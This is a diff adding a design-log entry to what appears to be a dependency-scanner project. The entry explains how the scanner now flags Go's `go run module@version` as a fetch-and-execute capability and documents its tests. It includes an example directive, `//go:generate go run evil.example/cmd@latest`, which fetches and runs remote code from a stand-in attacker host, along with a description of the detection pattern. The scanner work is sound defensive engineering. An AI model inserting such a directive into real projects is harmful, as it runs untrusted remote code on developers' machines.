@@ -3503,3 +3503,43 @@ Deferred to later OPU-28 increments (documented): per-dependency vendor/ and mod
 attribution; and `go run <remote>@<version>` as a Go package runner (an npx analog). With
 Increment 3 the three build-surface execution phases Go actually has — on-demand generate,
 build-time cgo, and runtime init — are all covered.
+
+## D-94 — OPU-28 (Increment 4): `go run <module>@<version>` — the Go package runner
+
+The last OPU-28 build-surface item: Go's own npx analog. Since Go 1.17, `go run
+<module>@<version>` FETCHES and RUNS a remote module in one step (network + exec). It most
+often rides a `//go:generate go run evil.example/cmd@latest` directive — which Increment 1
+already extracts through scanCaps, but which produced no capability because `go run` was not a
+runner marker, so a hostile remote runner was a silent miss.
+
+goRunRemoteRe adds it, keyed on the `@version` suffix — the exact run-vs-fetch discriminator:
+Go requires `@version` to fetch a remote module, so `go run ./internal/gen`, `go run .`, and
+`go run main.go` (local code, no fetch) carry no version and stay quiet, the same discipline
+that keeps `pnpm exec` off the runner set (Part E) and that Increment 1's benign
+`go run ./local` go:generate relies on. A match is CapNetwork + CapExec → VC-002b (composing to
+VC-002d with a credential half), the same verdict npx / pipx run / gem exec / dnx already get.
+The prefix class carries `'"` so a shell-string invocation (`os.system('go run x@latest')`) is
+caught too. `go install <module>@<version>` is unchanged — it is pkg-install (network), already
+covered, and a different subcommand.
+
+Honest note on noise. `go run <tool>@<version>` in a //go:generate directive is a common,
+LEGITIMATE Go pattern for pinning a codegen tool (stringer, mockgen). It genuinely reaches the
+network and executes remote code at generate time, so surfacing it as gate-eligible VC-002b is
+the correct, consistent treatment — identical to how `npx only-allow pnpm` and the other benign
+runners are scored (a benign network+exec runner is gate-eligible, never a block, and the
+on-demand `go generate` trigger is weaker still). A Part-D-style allowlist of known-benign
+`go run` tool modules is the natural noise-reduction refinement if the volume warrants it;
+deferred, and noted so the register tracks it.
+
+Proof: scanCaps table test (remote@version bare / with a flag / in a shell string → network+
+exec; the local `go run` forms → quiet; `go install …@latest` unchanged) and an end-to-end
+wiring test through the real gomod adapter (`//go:generate go run evil.example/cmd@latest` fires
+VC-002b; `//go:generate go run ./internal/gen` stays silent). The `@version` discriminator is
+mutation-proven: dropping it makes a local `go run main.go` wrongly fetch, flipping a negative.
+Real-world oracle: a re-scan of depSNORT's own 251 .go files still yields zero hooks. gofmt/vet
+clean, go test -race ./... green.
+
+With this, OPU-28's build-surface coverage is complete across Go's three execution phases
+(on-demand generate, build-time cgo, runtime init) plus the go-run remote-runner shape; the one
+remaining register item is per-dependency vendor/ and module-cache attribution (Increment 1-4
+scan the root module).
